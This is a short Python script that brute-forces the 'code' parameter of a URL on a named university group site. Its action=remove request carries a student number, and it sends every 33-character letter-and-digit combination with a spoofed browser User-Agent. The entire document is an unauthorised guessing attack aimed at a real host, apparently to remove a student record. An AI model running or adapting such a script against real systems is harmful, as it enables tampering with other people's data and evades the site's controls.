from urllib.request import Request, urlopen
from urllib.parse import urlencode
from itertools import product

chars = '0123456789zxcvbnmlkjhgfdsaqwertyuiop' # chars to look for
url = "http://grupy.schocker.pl/5sem/index.php?action=remove&student=202113&code="

for lenght in range( 33, 34 ):
	to_attempt = product(chars, repeat=lenght)
	for attempt in to_attempt:
		req = Request(url + "".join(attempt), headers={'User-Agent': 'Mozilla/5.0'})
		resp = urlopen(req)